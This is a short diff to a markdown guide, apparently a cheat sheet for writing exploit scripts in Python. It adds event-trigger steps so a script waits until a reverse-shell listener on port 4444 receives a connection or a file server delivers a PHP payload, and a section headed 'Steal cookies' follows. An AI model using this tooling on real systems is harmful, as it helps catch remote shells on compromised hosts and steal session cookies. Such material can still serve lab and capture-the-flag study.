@@ -161,6 +161,11 @@ def _interact(conn):
 # ...
 start_listener("0.0.0.0", 4444)
 ```
+### Event Triggers
+1. Add `revshell_callback = threading.Event()`
+2. Add in the  `_interact()` function `revshell_callback.set()` as the first line to trigger an event when a host is binded
+3. I recomend adding a small sleep to catch the event: `time.sleep(2)`
+4. Finally, in your logic, wait for the event to trigger `revshell_callback.wait(timeout=10) # Wait 10s`
 
 ## HTTP Server
 ```python
@@ -210,6 +215,11 @@ def start_file_server(host, port):
 # ...
 start_file_server("0.0.0.0", 80)
 ```
+### Event Triggers
+1. Add `php_file_callback = threading.Event()`
+2. In the `do_Get()` function add `php_file_callback.set()` when the file is downloaded
+3. Finally, in your logic, wait for the event to trigger `php_file_callback.wait(timeout=10) # Wait 10s`
+
 ### Steal cookies
 ```python
 def doGET(self):
